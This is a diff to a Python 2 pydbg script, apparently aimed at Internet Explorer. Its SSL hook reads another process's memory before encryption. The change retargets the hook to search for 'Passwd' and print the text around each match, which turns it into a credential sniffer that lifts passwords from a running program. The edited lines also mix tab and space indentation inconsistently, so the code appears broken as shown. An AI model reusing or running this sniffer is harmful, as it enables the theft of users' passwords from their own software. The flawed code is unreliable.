@@ -7,26 +7,27 @@ import sys
 dbg = pydbg()
 found_ie = False
 
-pattern1 = "password"
+pattern1 = "Passwd"
 pattern2 = "name"
 pattern3 = "haha"
 
 def ssl_sniff(dbg, args):
-	buffer = ""
+	buf = ""
 	offset = 0
 	while 1:
 		byte = dbg.read_process_memory(args[1] + offset, 1)
 
 		if byte != "\x00":
-			buffer += byte
+			buf += byte
 			offset += 1
 			continue
 		else:
 			break
 
 
-        if pattern3 in buffer:
-                print "Pre-Encrypted: %s" % buffer
+        if pattern1 in buf:
+				index = buf.index(pattern1)
+                print "Pre-Encrypted: %s" % buf[index-30:index+30]
 
 	return DBG_CONTINUE
 
